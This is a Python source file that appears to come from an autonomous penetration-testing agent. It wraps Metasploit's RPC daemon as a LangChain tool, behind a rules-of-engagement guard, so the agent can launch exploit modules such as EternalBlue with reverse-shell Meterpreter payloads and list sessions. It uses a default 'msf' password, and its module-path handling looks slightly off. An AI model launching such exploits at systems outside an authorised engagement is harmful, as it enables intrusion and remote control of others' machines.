import msgpack
import httpx
from pydantic import BaseModel, Field
from langchain_core.tools import tool
from autored.roe_guard import roe_guard
from autored.logging import get_logger
from typing import Any

log = get_logger("tools.metasploit")


class MsfResult(BaseModel):
    method: str
    success: bool = False
    data: dict = Field(default_factory=dict)
    error: str | None = None
    duration_sec: float = 0.0


class MsfRpcClient:
    """Async client for Metasploit RPC daemon (msfrpcd).

    Requires msfrpcd running on the specified host:port.
    Start with: msfrpcd -P <password> -p 55553 -a 127.0.0.1
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 55553, password: str = "msf"):
        self.host = host
        self.port = port
        self.password = password
        self.token: str | None = None
        self.url = f"http://{host}:{port}/api/"

    async def _call(self, method: str, *args) -> Any:
        """Make an RPC call to msfrpcd."""
        if not self.token and method != "auth.login":
            raise RuntimeError("Not authenticated. Call login() first.")

        if method == "auth.login":
            msgpack_data = msgpack.packb([method, *args])
        else:
            msgpack_data = msgpack.packb([method, self.token, *args])

        async with httpx.AsyncClient(timeout=60) as client:
            response = await client.post(self.url, content=msgpack_data)
            if response.status_code != 200:
                raise RuntimeError(f"MSF RPC returned {response.status_code}")
            result = msgpack.unpackb(response.content, raw=False)
            if isinstance(result, dict) and "error" in result:
                raise RuntimeError(f"MSF RPC error: {result['error']}")
            return result

    async def login(self) -> str:
        """Authenticate to msfrpcd. Returns the session token."""
        try:
            token = await self._call("auth.login", self.password)
            # msfrpcd returns [method, token] for auth.login — take index 1.
            if isinstance(token, list) and len(token) >= 2:
                self.token = token[1]
            elif isinstance(token, list) and len(token) == 1:
                self.token = token[0]
            elif isinstance(token, str):
                self.token = token
            else:
                self.token = str(token)
            log.info("msf_login_success", host=self.host)
            return self.token
        except Exception as e:
            log.error("msf_login_failed", host=self.host, error=str(e))
            raise RuntimeError(f"MSF RPC login failed: {e}")

    async def execute_exploit(
        self,
        module: str,
        target: str,
        payload: str,
        lhost: str,
        lport: int,
        options: dict | None = None,
    ) -> dict:
        """Execute a Metasploit exploit module.

        Args:
            module: Full module path (e.g., "exploit/windows/smb/ms17_010_eternalblue")
            target: Target RHOSTS
            payload: Payload module (e.g., "windows/x64/meterpreter/reverse_tcp")
            lhost: Local host for reverse connection
            lport: Local port for reverse connection
            options: Additional module options

        Returns:
            Dict with job_id and (eventually) session info.
        """
        # Use module.execute
        opts = {
            "RHOSTS": target,
            "PAYLOAD": payload,
            "LHOST": lhost,
            "LPORT": str(lport),
        }
        if options:
            opts.update(options)

        result = await self._call("module.execute", "exploit", module.split("/")[-1], opts)
        log.info("msf_exploit_executed", module=module, target=target, result=result)
        return result if isinstance(result, dict) else {"raw": result}

    async def list_sessions(self) -> dict:
        """List active Meterpreter sessions."""
        return await self._call("session.list")

    async def check_session(self, session_id: int) -> dict:
        """Get info about a specific session."""
        return await self._call("session.info", session_id)


@tool
@roe_guard(allowed_categories=["exploit"])
async def metasploit_rpc(
    method: str,
    params: dict,
    engagement_id: str = "",
) -> MsfResult:
    """Execute a Metasploit RPC method.

    Args:
        method: RPC method ("login", "execute_exploit", "list_sessions", "check_session")
        params: Method parameters (e.g., {"module": "...", "target": "...", "payload": "...", "lhost": "...", "lport": 4444})
        engagement_id: Current engagement ID

    Returns:
        MsfResult with success status and data.
    """
    import time
    start = time.time()

    client = MsfRpcClient(
        host=params.get("host", "127.0.0.1"),
        port=params.get("port", 55553),
        password=params.get("password", "msf"),
    )

    try:
        if method == "login":
            token = await client.login()
            return MsfResult(method=method, success=True, data={"token": token}, duration_sec=time.time() - start)
        elif method == "execute_exploit":
            if not client.token:
                await client.login()
            result = await client.execute_exploit(
                module=params["module"],
                target=params["target"],
                payload=params["payload"],
                lhost=params["lhost"],
                lport=params["lport"],
                options=params.get("options"),
            )
            return MsfResult(method=method, success=True, data=result, duration_sec=time.time() - start)
        elif method == "list_sessions":
            if not client.token:
                await client.login()
            sessions = await client.list_sessions()
            return MsfResult(method=method, success=True, data={"sessions": sessions}, duration_sec=time.time() - start)
        else:
            return MsfResult(method=method, success=False, error=f"Unknown method: {method}", duration_sec=time.time() - start)
    except Exception as e:
        log.error("msf_rpc_failed", method=method, error=str(e))
        return MsfResult(method=method, success=False, error=str(e), duration_sec=time.time() - start)
